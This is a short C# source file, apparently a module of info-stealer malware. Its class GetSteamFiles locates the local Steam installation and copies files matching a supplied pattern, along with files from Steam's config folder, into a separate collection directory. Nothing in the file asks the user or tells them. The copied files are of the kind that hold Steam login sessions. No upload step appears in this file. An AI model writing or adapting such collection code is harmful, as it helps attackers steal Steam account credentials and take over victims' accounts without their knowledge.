namespace DomaNet.Steam
{
    using System.IO;

    internal class GetSteamFiles : SteamPath
    {
        public static void Copy(string Expansion, string ConfigFiles, string Name = "config")
        {
            var SaveConfig = Path.Combine(GetDirPath.Steam_Folder, Name);
            var LocalSteamDir = Path.Combine(GetLocationSteam(), Name);

            if (Directory.Exists(GetLocationSteam()))
            {
                if (!Directory.Exists(GetDirPath.Steam_Folder))
                {
                    Directory.CreateDirectory(GetDirPath.Steam_Folder);
                    foreach (var file in Directory.GetFiles(GetLocationSteam(), Expansion))
                    {
                        File.Copy(file, Path.Combine(GetDirPath.Steam_Folder, Path.GetFileName(file)));
                    }
                    if (!Directory.Exists(SaveConfig))
                    {
                        Directory.CreateDirectory(SaveConfig);
                        foreach (var file2 in Directory.GetFiles(LocalSteamDir, ConfigFiles))
                        {
                            File.Copy(file2, Path.Combine(SaveConfig, Path.GetFileName(file2)));
                        }
                    }
                }
            }
        }
    }
}